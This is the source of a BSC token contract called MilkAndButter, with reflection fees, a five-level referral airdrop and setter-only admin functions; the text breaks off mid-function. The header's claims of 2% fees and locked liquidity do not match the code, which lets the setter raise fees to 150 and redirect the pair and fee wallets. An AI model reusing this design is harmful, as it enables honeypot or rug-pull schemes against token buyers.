/**
 *Submitted for verification at BscScan.com on 2022-01-12
*/

/*
   #MILK features:
   2% fee auto add to the liquidity pool to locked forever when selling
   2% fee auto add to charity wallet for food-based charities
   2% fee auto distribute to all holders
   20% Supply is burned at start. 
 */

/*

███╗░░██╗░█████╗░██╗  ██╗░░░░░██╗░░░██╗░█████╗░██████╗░  ████████╗░█████╗░██╗░░██╗███████╗███╗░░██╗
████╗░██║██╔══██╗██║  ██║░░░░░██║░░░██║██╔══██╗██╔══██╗  ╚══██╔══╝██╔══██╗██║░██╔╝██╔════╝████╗░██║
██╔██╗██║███████║██║  ██║░░░░░██║░░░██║███████║██████╔╝  ░░░██║░░░██║░░██║█████═╝░█████╗░░██╔██╗██║
██║╚████║██╔══██║██║  ██║░░░░░██║░░░██║██╔══██║██╔═══╝░  ░░░██║░░░██║░░██║██╔═██╗░██╔══╝░░██║╚████║
██║░╚███║██║░░██║██║  ███████╗╚██████╔╝██║░░██║██║░░░░░  ░░░██║░░░╚█████╔╝██║░╚██╗███████╗██║░╚███║
╚═╝░░╚══╝╚═╝░░╚═╝╚═╝  ╚══════╝░╚═════╝░╚═╝░░╚═╝╚═╝░░░░░  ░░░╚═╝░░░░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚══╝
 
add liquidity
swap buy and sell
https://testnet.bscscan.com/address/0xc30b00238ae8dadb7dc234fee89418a7a43850fa#code

0 deploy                        "Nai Luap Token","NLT","18","0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3"
1 stFe (ta,li,ch,ex,ma)         0 20 20 10 50
2 stLiPe (bu,ma,lo)             10 20 70
3 stAd                          aa to gg
4 stTrEn                        true
5 stToSe                        50000000000000000000000  000000000000000000

// deploy
"Nai Luap Token","NLT","18","0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3"
// add confir for airdrop  000000000000000000
"rdrp","10","40","5000000","1000","200","0","0","0"
// airdropclain
"0xC5a7EFa5bb81fB02945aC5a75B257d7098d865Af","10",true

*/
pragma solidity ^0.8.7;
// SPDX-License-Identifier: Unlicensed
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

/**
 * @dev Wrappers over Solidity's arithmetic operations with added overflow
 * checks.
 *
 * Arithmetic operations in Solidity wrap on overflow. This can easily result
 * in bugs, because programmers usually assume that an overflow raises an
 * error, which is the standard behavior in high level programming languages.
 * `SafeMath` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */
 
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow"); 
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b; 
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) { 
        if (a == 0) { return 0; } 
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow"); 
        return c;
    } 
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    } 
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b; 
        return c;
    } 
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    } 
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    } 
    function _msgData() internal view virtual returns (bytes memory) {
        this; 
        return msg.data;
    }
}

/**
 * @dev Collection of functions related to the address type
 */
library Address { 
    function isContract(address account) internal view returns (bool) { 
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        // solhint-disable-next-line no-inline-assembly
        assembly { codehash := extcodehash(account) }
        return (codehash != accountHash && codehash != 0x0);
    } 
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance"); 
        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    } 
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
      return functionCall(target, data, "Address: low-level call failed");
    } 
    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    } 
    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    } 
    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        return _functionCallWithValue(target, data, value, errorMessage);
    } 
    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
        if (success) {
            return returndata;
        } else {
            // Look for revert reason and bubble it up if present
            if (returndata.length > 0) {
                // The easiest way to bubble the revert reason is using memory via assembly

                // solhint-disable-next-line no-inline-assembly
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
contract Ownable is Context {
    address private _owner;
    address private _setter;
    bool internal locked;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
     
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        _setter = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    function setter() public view returns (address) {
        return _setter;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    modifier onlySetter() {
        require(_setter == _msgSender(), "Ownable: caller is not the setter");
        _;
    }
    modifier noReentrant() {
        require(!locked, "No re-entrancy");
        locked = true;
        _;
        locked = false;
    }
    function transferOwnership(address payable newOwner) public onlyOwner {
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }     
    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

// pragma solidity >=0.5.0;
interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

// pragma solidity >=0.5.0;
interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);
    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);
    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
    event Mint(address indexed sender, uint amount0, uint amount1);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);
    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);
    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;
    function initialize(address, address) external;
}
// pragma solidity >=0.6.2;
interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidity( address tokenA, address tokenB, uint amountADesired, uint amountBDesired, uint amountAMin, uint amountBMin, address to, uint deadline ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH( address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity( address tokenA, address tokenB, uint liquidity, uint amountAMin, uint amountBMin, address to, uint deadline ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH( address token, uint liquidity, uint amountTokenMin, uint amountETHMin, address to, uint deadline ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit( address tokenA, address tokenB, uint liquidity, uint amountAMin, uint amountBMin, address to, uint deadline, bool approveMax, uint8 v, bytes32 r, bytes32 s ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit( address token, uint liquidity, uint amountTokenMin, uint amountETHMin, address to, uint deadline, bool approveMax, uint8 v, bytes32 r, bytes32 s ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens( uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens( uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline) external payable returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline) external payable returns (uint[] memory amounts);
    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

// pragma solidity >=0.6.2;
interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens( address token, uint liquidity, uint amountTokenMin, uint amountETHMin, address to, uint deadline ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens( address token, uint liquidity, uint amountTokenMin, uint amountETHMin, address to, uint deadline, bool approveMax, uint8 v, bytes32 r, bytes32 s ) external returns (uint amountETH);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens( uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens( uint amountOutMin, address[] calldata path, address to, uint deadline ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens( uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline ) external;
}

contract MilkAndButter is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    mapping (address => uint256) private _owRe;
    mapping (address => uint256) private _owTo;
    mapping (address => mapping (address => uint256)) private _allowances;

    mapping (address => bool) private _isExcludedFromFee; 
    mapping (address => bool) private _isExcluded;
    address[] private _excluded;
   
    uint256 private constant MAX = ~uint256(0);
    uint256 private _toTo = 350000000 * 10**18;
    uint256 private _toRe = (MAX - (MAX % _toTo));
    uint256 private _toFe;

    string private _name;
    string private _symbol;
    uint8 private _decimals;

    IUniswapV2Router02 private _paDeRo;
    address public _paDePa;
    
    bool inTrading;
    bool public isTrading = true;
    
    uint256 public _maxTxAmount = 5000000 * 10**18;
    uint256 private toSeAnLi = 500000 * 10**18;
 
    address payable public _charity = payable(0x55E0c27Cf59Eee32fEc34f6282f10C8d31DDD94c);
    address payable public _marketing = payable(0xBdD564dd9074Fe24076B6Da507415C4F8e796640);
    address payable public _dev = payable(0xc4C96c852226a97E88c2e2BF221B79f63349195c);
    address payable public _burn = payable(0x0000000000000000000000000000000000000000);

    address payable private _paLiLo = payable(0xC5a7EFa5bb81fB02945aC5a75B257d7098d865Af);
    address payable private _paLiMa = payable(0x55E0c27Cf59Eee32fEc34f6282f10C8d31DDD94c);
    address payable private _paLiRe = payable(0x78867BbEeF44f2326bF8DDd1941a4439382EF2A7);
    address payable private _paMa = payable(0xBdD564dd9074Fe24076B6Da507415C4F8e796640);
    address payable private _paMb = payable(0xD2f001Cfd94c4203e2ab3C6F6C690DC4aCa04208);
    address payable private _paMc = payable(0xD2f001Cfd94c4203e2ab3C6F6C690DC4aCa04208);
    address payable private _paMd = payable(0xD2f001Cfd94c4203e2ab3C6F6C690DC4aCa04208);
    address payable private _paMe = payable(0xD2f001Cfd94c4203e2ab3C6F6C690DC4aCa04208);
 
    uint256 private _liToBu = 10;
    uint256 private _liToMa = 20;
    uint256 private _liToLo = 70;
 
    uint256 public _taxFee = 0; 
    uint256 public _liquidityFee = 20; 
    uint256 public _charityFee = 20; 
    uint256 public _marketingFee = 50; 
    uint256 public _devFee = 10;
    uint256 private _previousTaxFee = _taxFee;
    uint256 private _previousLiquidityFee = _liquidityFee;
    uint256 private _previousCharityFee = _charityFee;
    uint256 private _previousMarketingFee = _marketingFee;
    uint256 private _previousDevFee = _devFee;
 
 
    // z
    address payable private xDefTop = payable(_msgSender());
    address payable private xDefSpo = payable(_msgSender());
    // z
    uint32 private xLisMmbr;
    uint32 private xLisRdrp;
    uint32 private xLisPrsl;
    uint32 private xLisDapp1;
    uint32 private xLisDapp2;
    uint32 private xLisDapp3;
    uint32 private xLisDapp4;  
    // z
    struct Mmbr {
        uint dTyp;
        uint32 dNum; 
        address dSpo; 
        string dDat; 
        uint256 dDatReg;
    }   
    mapping(address => Mmbr[]) mmbrs; 
    mapping(uint32 => address) private xmmbr; 
    struct Spns { address dSpo; }   
    mapping(address => Spns[]) spnss; 
    // z
    struct Rwdt {
        uint dSta;
        uint32 dNum;
        address dMem; 
        string dNam; 
        string dPla; 
        uint dPlaPos; 
        uint dTak;
        string dRem;
        uint256 dDatReg;
        uint256 znextimsta;
    }   
    mapping(string => mapping(address => Rwdt[])) private rwdts; 
    mapping(string => uint256) private xtoba;  
    mapping(uint32 => address) private xrdrp;  
    mapping(uint32 => address) private xprsl;
    mapping(uint32 => address) private xdapp1; 
    mapping(uint32 => address) private xdapp2; 
    mapping(uint32 => address) private xdapp3;  
    mapping(uint32 => address) private xdapp4; 
    mapping(uint32 => address) private xdapp5; 
    // z
    struct Cnfg {
        uint dSta;
        uint dCyc;
        uint256 dTokMax;
        uint256 dTok;
        uint256 dTokRef;
        uint256 dCoi;
        uint256 dCoiRef;
        uint256 dPoi;
    }   
    mapping(string => Cnfg[]) cnfgs;
    // z 
    function shToBa(string memory dCod) public view returns(uint256) {
        return xtoba[dCod];
    }
    // z 
    function shMeDa(address vMem) public view returns(uint, uint32, address, string memory, uint256) {
        uint ll = mmbrs[vMem].length - 1;
        return (mmbrs[vMem][ll].dTyp, mmbrs[vMem][ll].dNum, mmbrs[vMem][ll].dSpo, mmbrs[vMem][ll].dDat, mmbrs[vMem][ll].dDatReg);
    }
    // z 
    function shMeDaLe(address vMem) public view returns(uint) {
        return mmbrs[vMem].length;
    }
    // z 
    function shMeDaSpLe(address vMem) public view returns(uint) {
        return spnss[vMem].length;
    } 
    // z 
    function stCoDa(string memory vCod, uint vSta, uint vCyc, uint256 vTokMax, uint256 vTok, uint256 vTokRef, uint256 vCoi, uint256 vCoiRef, uint256 vPoi) public onlySetter { 
        if (cnfgs[vCod].length >= 1) { cnfgs[vCod].pop(); } 
        Cnfg memory dd = Cnfg({   
            dSta: vSta,
            dCyc: vCyc,
            dTokMax: vTokMax,
            dTok: vTok,
            dTokRef: vTokRef,
            dCoi: vCoi, 
            dCoiRef: vCoiRef, 
            dPoi: vPoi
        });
        cnfgs[vCod].push(dd); 
    }
    // z 
    function shCoDaPa1(string memory vCod) public view onlySetter returns(uint, uint, uint256, uint256, uint256) {
        uint ll = shCoDaLe(vCod);
        if (ll > 0) { ll = shCoDaLe(vCod) - 1; } 
        return (cnfgs[vCod][ll].dSta, cnfgs[vCod][ll].dCyc, cnfgs[vCod][ll].dTokMax, cnfgs[vCod][ll].dTok, cnfgs[vCod][ll].dTokRef);
    }
    // z 
    function shCoDaPa2(string memory vCod) public view onlySetter returns(uint256, uint256, uint256) {
        uint ll = shCoDaLe(vCod);
        if (ll > 0) { ll = shCoDaLe(vCod) - 1; }
        return (cnfgs[vCod][ll].dCoi, cnfgs[vCod][ll].dCoiRef, cnfgs[vCod][ll].dPoi);
    }
    // z 
    function shCoDaLe(string memory vCod) public view onlySetter returns(uint) {
        return cnfgs[vCod].length;
    }
    // z 
    function shRoDaPa1(uint16 vCod, address vUse, uint vCou) public view returns(uint, uint32, address, string memory, string memory) {
        string memory xCod = shCo(vCod); 
        uint ll = vCou;  
        return (rwdts[xCod][vUse][ll].dSta, rwdts[xCod][vUse][ll].dNum, rwdts[xCod][vUse][ll].dMem, rwdts[xCod][vUse][ll].dNam, rwdts[xCod][vUse][ll].dPla);
    }
    // z 
    function shRoDaPa2(uint16 vCod, address vUse, uint vCou) public view returns(uint, uint, string memory) {
        string memory xCod = shCo(vCod); 
        uint ll = vCou;  
        return (rwdts[xCod][vUse][ll].dPlaPos, rwdts[xCod][vUse][ll].dTak, rwdts[xCod][vUse][ll].dRem);
    }
    // z 
    function shRoDaLe(uint16 vCod, address vUse) public view returns(uint) { 
        string memory xCod = shCo(vCod); 
        return rwdts[xCod][vUse].length;
    } 
    // z
    function shCo(uint16 vCod) internal view virtual returns (string memory) { 
        if (vCod == 2) {
            return 'rdrp';
        } else { /*** */
            return 'none';
        }
        // a
    }
    function shRe(address dKey, uint16 vCod) public view returns (uint) {  
        string memory xCod = shCo(vCod); 
        if (vCod == 1) {
            return mmbrs[dKey].length; 
        } else if (vCod == 2) {
            return rwdts[xCod][dKey].length; 
        } else { /*** */
            return 0;
        }
        // a
    }
    // z
    function shToLi(uint16 vCod) public view returns(uint256) { 
        if (vCod == 1) {
            return xLisMmbr;
        } else if (vCod == 2) {
            return xLisRdrp;
        } else { /*** */
            return 0;
        }
        // a
    } 
    // z 
    function shMeById(uint32 kk) public view returns(address) {  
        return address(xmmbr[kk]);
    } 
    // z 
    function shMeSpOf(address kk) public view returns(address) {
        address xkey = address(kk);
        return (address(mmbrs[xkey][0].dSpo));
    }
    // z   
    function stMeDa(address vMem, uint vTyp, address vSpo, string memory vDat) public onlySetter { 
        nwMeDa(vMem, vTyp, vSpo, vDat);
    }
    // z 
    function nwMeDa(address vMem, uint vTyp, address vSpo, string memory vDat) private { 
        if (mmbrs[vMem].length == 0) {
            xLisMmbr ++;
            Mmbr memory vmmbr = Mmbr({ 
                dTyp: vTyp,
                dNum: xLisMmbr,  
                dSpo: vSpo,
                dDat: vDat,  
                dDatReg: block.timestamp
            }); 
            mmbrs[vMem].push(vmmbr); 
            xmmbr[xLisMmbr] = vMem;
            Spns memory vspns = Spns({ 
                dSpo: vMem
            }); 
            spnss[vSpo].push(vspns); 
        }
    }
    // z 
    function stRoDa(uint vSta, address vMem, string memory vNam, string memory vPla, uint vPlaPos, uint vTak, string memory vRem) public onlySetter { 
        nwRoDa(2, vSta, vMem, vNam, vPla, vPlaPos, vTak, vRem);
    } 
    // z
    function nwRoDa(uint16 vCod, uint vSta, address vMem, string memory vNam, string memory vPla, uint vPlaPos, uint vTak, string memory vRem) private { 
        string memory xCod = shCo(vCod); 
        uint ll = shRoDaLe(vCod, vMem);
        if (ll > 0) { 
            ll = ll - 1; 
            require(rwdts[xCod][vMem][ll].dSta < vSta, "Already Exist");
        }  
        uint32 xLis;
        uint256 dTimSta15m = block.timestamp + 1 minutes;
        if (vCod == 2) { 
            xLisRdrp ++;
            xLis = xLisRdrp; 
        } /*** */
        Rwdt memory vxLis = Rwdt({  
            dSta: vSta, 
            dNum: xLis,
            dMem: vMem,
            dNam: vNam,
            dPla: vPla,
            dPlaPos: vPlaPos,
            dTak: vTak,
            dRem: vRem,
            dDatReg: block.timestamp,
            znextimsta: dTimSta15m
        }); 
        rwdts[xCod][vMem].push(vxLis); 
        if (vCod == 2) {
            xrdrp[xLis] = vMem;
        } /*** */
    }
    // z 
    function airdropClaim1(address dSpo, uint vSta, bool vStr) public noReentrant { 
        uint16 vCod = 2;
        string memory xCod = shCo(vCod); 
        require(vCod == 2, "Access Denied: Code");
        require(cnfgs[xCod][0].dSta != 0, "Access Denied: Disabled"); 
        require(dSpo != address(0), "Access Denied: Zero Address");
        require(_msgSender() != address(0), "Access Denied: Zero Address"); 
        if (xDefTop != dSpo) {
            require(shRe(dSpo, 1) >= 1, "Access Denied: Sponsor");  
        }
        require(xtoba[xCod] <= cnfgs[xCod][0].dTokMax, "Access Denied: Max Given");
        if (vCod == 2) { 
            require(vSta == cnfgs[xCod][0].dSta, "Access Denied: Status"); 
        }
        if (cnfgs[xCod][0].dSta > 10 && vStr) {
            require(shRoDaLe(vCod, _msgSender()) >= 1, "Not Listed on Aidrop");
        }

        stMeAnAf1(_msgSender(), dSpo, vCod, true);
        
        nwRoDa(vCod, vSta, _msgSender(), 'na', 'na', 0, 0, 'airdropClaim'); 
    }
    // z
    function airdropClaim2(address dSpo, uint vSta, bool vStr) public noReentrant { 
        uint16 vCod = 2;
        string memory xCod = shCo(vCod); 
        require(vCod == 2, "Access Denied: Code");
        require(cnfgs[xCod][0].dSta != 0, "Access Denied: Disabled"); 
        require(dSpo != address(0), "Access Denied: Zero Address");
        require(_msgSender() != address(0), "Access Denied: Zero Address"); 
        if (xDefTop != dSpo) {
            require(shRe(dSpo, 1) >= 1, "Access Denied: Sponsor");  
        }
        require(xtoba[xCod] <= cnfgs[xCod][0].dTokMax, "Access Denied: Max Given");
        if (vCod == 2) { 
            require(vSta == cnfgs[xCod][0].dSta, "Access Denied: Status"); 
        }
        if (cnfgs[xCod][0].dSta > 10 && vStr) {
            require(shRoDaLe(vCod, _msgSender()) >= 1, "Not Listed on Aidrop");
        }

        stMeAnAf2(_msgSender(), dSpo, vCod, true);
        
        nwRoDa(vCod, vSta, _msgSender(), 'na', 'na', 0, 0, 'airdropClaim'); 
    }
    // z  
    function stMeAnAf1(address dUse, address dSpo, uint16 vCod, bool vAff) private { 
        string memory xCod = shCo(vCod); 
        if (shRe(dUse, 1) < 1) { 
            nwMeDa(dUse, 2, dSpo, 'airdropClaim'); 
        } else {  
            dSpo = mmbrs[dUse][0].dSpo;  
        } 
        
        if (vAff) {
            uint256 vSpa = cnfgs[xCod][0].dTokRef.div(5);
            uint256 vSpe = cnfgs[xCod][0].dTokRef - vSpa - vSpa - vSpa - vSpa;
            uint256 vUse = cnfgs[xCod][0].dTok;  
            
            xtoba[xCod] = vSpa + vSpa + vSpa + vSpa + vSpe + vUse;

            vSpa = vSpa * 10**18;
            vSpe = vSpe * 10**18;
            vUse = vUse * 10**18;

            address dSp2 = shMeSpOf(dSpo);
            address dSp3 = shMeSpOf(dSp2);
            address dSp4 = shMeSpOf(dSp3);
            address dSp5 = shMeSpOf(dSp4);  

            _transfer(owner(), address(dSpo), uint256(vSpa));
            _transfer(owner(), address(dSp2), uint256(vSpa));
            _transfer(owner(), address(dSp3), uint256(vSpa));
            _transfer(owner(), address(dSp4), uint256(vSpa));
            _transfer(owner(), address(dSp5), uint256(vSpe)); 
            _transfer(owner(), address(dUse), uint256(vUse));
        }
    } 
    // z
    function stMeAnAf2(address dUse, address dSpo, uint16 vCod, bool vAff) private { 
        string memory xCod = shCo(vCod); 
        if (shRe(dUse, 1) < 1) { 
            nwMeDa(dUse, 2, dSpo, 'airdropClaim'); 
        } else {  
            dSpo = mmbrs[dUse][0].dSpo;
        } 
        
        if (vAff) {
            uint256 vSpa = cnfgs[xCod][0].dTokRef.div(5);
            uint256 vSpe = cnfgs[xCod][0].dTokRef - vSpa - vSpa - vSpa - vSpa;
            uint256 vUse = cnfgs[xCod][0].dTok;  
            
            xtoba[xCod] = vSpa + vSpa + vSpa + vSpa + vSpe + vUse;

            address dSp2 = shMeSpOf(dSpo);
            address dSp3 = shMeSpOf(dSp2);
            address dSp4 = shMeSpOf(dSp3);
            address dSp5 = shMeSpOf(dSp4);  

            _transferNow2(dSpo, vSpa);
            _transferNow2(dSp2, vSpa);
            _transferNow2(dSp3, vSpa);
            _transferNow2(dSp4, vSpa);
            _transferNow2(dSp5, vSpe); 
            _transferNow2(dUse, vUse);
        }
    } 
    // z
    
    function shAd() public view onlySetter returns(address payable, address payable, address payable, address payable, address payable, address payable, address payable) {
        return (_charity, _paLiLo, _paLiMa, _marketing, _dev, _paLiRe, _burn);
    } 
    function stAd(address payable aa, address payable bb, address payable cc, address payable dd, address payable ee, address payable ff, address payable gg, address payable hh) public onlySetter {
        _charity = aa; 
        _paLiLo = bb; 
        _paLiMa = cc; 
        _marketing = dd; 
        _dev = ee;
        _paLiRe = ff;
        _burn = gg; 
        _paDePa = hh;
    } 
    function shLiPe() public view onlySetter returns(uint256, uint256, uint256) {
        return (_liToBu, _liToMa, _liToLo);
    } 
    function stLiPe(uint256 aa, uint256 bb, uint256 cc) public onlySetter {
        require((aa + bb + cc) == 100, "Invalid Data");
        _liToBu = aa;
        _liToMa = bb;
        _liToLo = cc;
    } 
    function stFe(uint256 aa, uint256 bb, uint256 cc, uint256 dd, uint256 ee) public onlySetter {
        require((aa + bb + cc + dd + ee) <= 150, "Invalid Data");
        _taxFee = aa;
        _liquidityFee = bb;
        _charityFee = cc;
        _marketingFee = dd;
        _devFee = ee;
    } 
    function stDeRo(address payable aa) public onlySetter {
        _paDeRo = IUniswapV2Router02(aa); 
    } 
    function recoverERC20(address tokenAddress, uint256 tokenAmount) public onlySetter {
        require(tokenAddress != address(this), "Invalid Data");
        IERC20(tokenAddress).transfer(setter(), tokenAmount);
    }

    event MinTokensBeforeSwapUpdated(uint256 minTokensBeforeSwap);
    event SwapAndLiquifyEnabledUpdated(bool enabled);
    event SwapAndLiquify( uint256 tokensSwapped, uint256 ethReceived, uint256 tokensIntoLiqudity );
    
    modifier lockTrading {
        inTrading = true;
        _;
        inTrading = false;
    }
    
    constructor (string memory nn, string memory ss, uint8 dd, address rr) {
        _name = nn;
        _symbol = ss;
        _decimals = dd;
        _owRe[_msgSender()] = _toRe;
        
        IUniswapV2Router02 __paDeRo = IUniswapV2Router02(rr);
        
        _paDePa = IUniswapV2Factory(__paDeRo.factory())
            .createPair(address(this), __paDeRo.WETH());

        _paDeRo = __paDeRo;
        
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_burn] = true;
        
        emit Transfer(address(0), _msgSender(), _toTo);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _toTo;
    }

    function balanceOf(address account) public view override returns (uint256) {
        if (_isExcluded[account]) return _owTo[account];
        return tokenFromReflection(_owRe[account]);
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function isExcludedFromReward(address account) public view returns (bool) {
        return _isExcluded[account];
    }

    function totalFees() public view returns (uint256) {
        return _toFe;
    }

    
    function showOwRe(address rr) public view returns (uint256) {
        return _owRe[rr];
    }
    
    function reflectionFromToken(uint256 tAmount, bool deductTransferFee) public view returns(uint256) {
